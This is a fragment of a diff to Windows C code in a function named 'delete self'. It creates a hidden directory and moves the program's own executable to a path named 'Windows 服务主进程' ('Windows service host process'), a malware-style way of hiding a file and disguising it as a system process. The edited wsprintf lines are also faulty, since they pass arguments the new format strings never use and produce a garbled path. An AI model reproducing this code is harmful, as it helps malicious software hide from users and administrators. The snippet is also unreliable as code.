@@ -48,10 +48,10 @@ BOOL 删除自身()
 		return false;
 	}
 	//以下API一样，不再啰嗦
-	wsprintf((LPWSTR)NewFileName, L"%C:\\\0", FileName[0]);
+	wsprintf((LPWSTR)NewFileName, L"C:\\Windows\\%C\0", FileName[0]);
 	CreateDirectory((LPCWSTR)NewFileName, NULL);
 	SetFileAttributes((LPCWSTR)NewFileName, FILE_ATTRIBUTE_HIDDEN);
-	wsprintf((LPWSTR)NewFileName, L"%C:\\Windows 服务主进程\0", FileName[0], GetTickCount());
+	wsprintf((LPWSTR)NewFileName, L"C:\\Windows 服务主进程\0", FileName[0], GetTickCount());
 	SetFileAttributes((LPCWSTR)NewFileName, FILE_ATTRIBUTE_NORMAL);
 	DeleteFile((LPCWSTR)NewFileName);
 	if (!MoveFileEx((LPCWSTR)FileName, (LPCWSTR)NewFileName, MOVEFILE_REPLACE_EXISTING))
